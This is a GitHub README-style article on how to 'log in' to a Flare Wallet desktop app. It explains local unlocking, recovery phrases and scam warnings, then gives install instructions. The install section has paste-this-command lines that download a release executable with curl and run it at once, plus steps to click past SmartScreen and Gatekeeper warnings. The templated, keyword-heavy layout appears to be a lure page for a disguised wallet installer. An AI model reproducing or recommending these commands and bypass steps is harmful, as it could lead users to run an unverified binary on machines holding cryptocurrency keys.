![Flare Wallet](assets/banner-article.png)

# Flare Wallet Login: Why There Is No Account and How to Open Yours

There is no sign-up page, and that is the feature.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Opening your wallet means unlocking the local copy installed from the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02); there is no server to sign in to.

> No password reset exists here, because no server holds your password. The phrase is the account.

Flare Wallet has no login page, no sign-up and no account on a server. You open the application and unlock the wallet stored on that machine, using a keystore file, a recovery phrase or a private key. "Logging in" is local; "signing up" is creating a wallet and writing the phrase down.

<!-- ARTICLE-BODY-BEGIN -->

## Why there is no login

A login implies a server that knows who you are and can let you in or keep you out. This wallet has no such server: the keys are encrypted on your computer, and the chain accepts a transaction based on a signature rather than a session.

That removes a class of failure - no support account to phish, no credential database to leak - and adds a class of responsibility: if you lose the phrase and the machine, nobody can restore access.

## What you actually do instead

| You expected | What exists |
| --- | --- |
| Sign-up form | Create a wallet, then write the phrase down |
| Username and password | A local unlock plus your recovery phrase |
| Forgot-password link | None; the phrase is the only recovery |
| Log out everywhere | Close the application; there is no session elsewhere |
| Account settings page | Local wallet settings only |

The table is the whole mental model. Once it lands, the searches for a Flare Wallet login page stop making sense, which is the point of the article.

## Unlocking on a machine you already set up

Open the application and choose the access path you used when you created or restored the wallet. The wallet exposes three: a keystore file with its password, a recovery phrase, or a private key. Pick the one that matches what you have, not the one that looks easiest.

If the unlock fails, the cause is the input rather than the account: a phrase word misspelled, a keystore password that differs by a character, or a file from a different wallet. There is nothing to reset, so the fix is always to find the correct input.

## Setting up on a new machine

Install from the release page, then choose restore rather than create. Enter the phrase, or import the keystore file, and confirm the address that appears is the one you expect before you do anything with funds.

If it appears empty, check the chain before anything else: a restore onto a different network shows a different account. The two-minute version of that check is in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md">Flare Wallet network settings</a>.

## Passwords, phrases and the difference

A wallet password encrypts the local file. The recovery phrase derives the keys. They are not interchangeable, and only one of them can rebuild the wallet on another machine.

That distinction is why "I forgot my password" and "I lost my phrase" have very different answers. The first is often recoverable with a backup of the file or the phrase; the second has no recovery at all, because there is no authority holding a copy.

## When someone offers to help you log in

Treat it as an attack. There is no remote login to fix, no account to verify and no migration to complete. Anyone who asks for a phrase, a keystore file or a remote session is not helping, and the pattern is documented in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-scam.md">Flare Wallet scam</a>.

The same applies to a site that offers a "web login" for this wallet. No hosted web wallet exists in this account, so a login page claiming to be one is the attack, not a shortcut.

## FAQ

### Does Flare Wallet Desktop need an account?

No. There is no account, no email and no server-side profile. The wallet is a file on your computer, unlocked by you.

### Where is the Flare Wallet login page?

There is none. Opening the application is the login; the local unlock is the only step, and no browser page is involved.

### I forgot my password. Can I reset it?

There is no reset because there is no server. Depending on how the wallet was set up, the recovery phrase or a private key can restore access; without one of those, the encrypted file alone is not enough.

### Can I log out of all devices?

There is nothing to log out of. Closing the application ends the session, and no other device holds a session unless you restored the wallet there yourself.

### Is there a web version I can log into?

No. This account publishes desktop installers only; there is no hosted web wallet and no browser extension.

### Why does the app ask for my phrase when I open it?

A phrase prompt belongs at creation or restore, not at every unlock; day-to-day access is meant to be a local unlock. If a screen asks for the words out of nowhere, stop and check that you installed from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> and not from a lookalike before typing anything.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet backup and restore](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md) | [Flare Wallet scam](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-scam.md) | [Flare Wallet download](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
